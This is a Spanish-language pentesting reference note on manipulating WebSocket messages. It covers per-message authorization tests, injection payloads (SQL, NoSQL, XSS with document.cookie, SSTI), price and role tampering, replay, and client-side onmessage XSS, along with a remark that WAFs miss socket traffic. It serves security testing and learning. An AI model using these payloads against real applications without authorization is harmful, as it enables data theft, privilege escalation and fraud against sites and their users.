---
tipo: meta
aliases:
  - manipulación de WebSocket
  - inyección por WebSocket
tags:
  - meta/referencia
  - dominio/web
---

# WebSocket - matriz de manipulación

> [!info] Referencia pura, no un zettel
> Qué hacer con un socket abierto: manipular mensajes, probar autorización, inyectar hacia sinks. El reconocimiento está en [[WebSocket - matriz de reconocimiento]]; el criterio, en [[WebSocket - confianza del canal]].

Con el socket abierto —propio o secuestrado— y el protocolo de mensajes mapeado, se edita cada mensaje. Burp intercepta y edita los mensajes de WebSocket como cualquier petición.

## 1. Autorización por mensaje

Ver [[WebSocket - confianza del canal]]. El servidor autenticó el handshake; ¿revalida cada mensaje?

Probar acciones e identificadores ajenos:

```json
{"action":"getMessages","chatId":"chat-de-otro"}
{"action":"deleteUser","userId":"456"}
{"action":"setRole","role":"admin"}
{"type":"read","messageId":"ajeno"}
```

Método: por cada acción que la interfaz ofrece con lo propio, repetirla apuntando a un objeto ajeno o a una acción de más privilegio. Es [[Control de acceso - matriz de pruebas]] sobre el canal.

| Comportamiento | Qué significa |
|---|---|
| La acción sobre lo ajeno responde con datos | Autz no revalidada — hallazgo |
| Responde `null` o error de permiso | Autz presente por mensaje: bien hecho |
| La acción de más privilegio funciona | Escalada vertical por el canal |

## 2. Inyección por mensaje

El mensaje es el vector; la clase es la del sink. Los payloads salen del dominio correspondiente.

| Campo llega a | Payload | Dominio |
|---|---|---|
| Una consulta SQL | `' OR '1'='1` | [[SQLi contextos - matriz de referencia]] |
| Una consulta NoSQL | `{"$ne":null}` | [[NoSQL operadores - matriz de referencia]] |
| Otro cliente de chat (se reenvía) | `<img src=x onerror=alert(1)>` | [[XSS contextos - matriz de referencia]] |
| Un comando | metacaracteres de shell | [[Command injection contextos - matriz de referencia]] |
| Una plantilla del servidor | `${7*7}` | [[SSTI - matriz de identificación]] |

```json
{"action":"search","query":"' OR '1'='1"}
{"action":"sendMessage","text":"<img src=x onerror=alert(document.cookie)>"}
```

El XSS por mensaje es el más específico de WebSocket: en un chat, un mensaje con payload se **reenvía a los otros clientes** y ejecuta en sus navegadores. Es XSS almacenado entregado por el canal, y ninguna defensa de HTTP lo ve pasar.

> [!warning] El WAF es ciego a los mensajes
> Un payload que el WAF bloquearía en una petición HTTP normal pasa sin problema por el socket: la mayoría de los WAF inspeccionan el handshake y después no miran los mensajes. Es la ventaja estructural del canal para el atacante, y el punto ciego de fuente para el defensor.

## 3. Manipulación de estructura

Cambiar tipos y campos que el servidor no valida:

```json
{"price": 100}     →  {"price": 0}
{"price": "100"}   →  {"price": {"$ne": null}}
{"qty": 1}         →  {"qty": -1}
{"userId": "mine"} →  {"userId": "admin"}
```

Agregar campos que la interfaz no manda pero el servidor lee —`isAdmin`, `role`, `discount`— es el equivalente de [[Control de acceso - mass assignment]] sobre el canal.

## 4. Repetición y orden

- **Repetir** un mensaje de acción con efecto —un canje, un voto— si no hay control de unicidad. Se cruza con [[MOC - Race conditions]]: los mensajes de un socket llegan rápido y sin el jitter de peticiones separadas.
- **Reordenar** mensajes de un flujo de varios pasos para saltarse una validación intermedia.

## 5. Del lado del cliente — mensajes entrantes

No solo se atacan los mensajes salientes. Si un mensaje entrante del servidor se inserta en el DOM sin sanear, un atacante que controle lo que el servidor reenvía —vía § 2— logra XSS en la víctima. El sink está en el cliente:

```js
ws.onmessage = e => div.innerHTML = e.data;   // vulnerable
```

Es [[XSS - DOM-based]] con la fuente en el WebSocket, y se detecta buscando cómo el cliente maneja `onmessage`.

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| La acción ajena responde con datos | Autz no revalidada por mensaje |
| El payload de inyección no dispara | El campo se parametriza; probar otro campo |
| El XSS no se reenvía | Los mensajes no van a otros clientes, o se sanean al reenviar |
| El precio manipulado se rechaza | Hay validación de esquema/tipo |
| El mensaje repetido no duplica | Hay control de unicidad. Probar carrera igual |
| El socket se cierra al editar | Puede haber una firma o secuencia; revisar el protocolo |
| Burp no muestra los mensajes | Es un binario o socket.io con framing propio; decodificar |

## Relacionadas

[[MOC - WebSocket]] · [[WebSocket - matriz de reconocimiento]] · [[WebSocket - confianza del canal]] · [[Control de acceso - matriz de pruebas]]
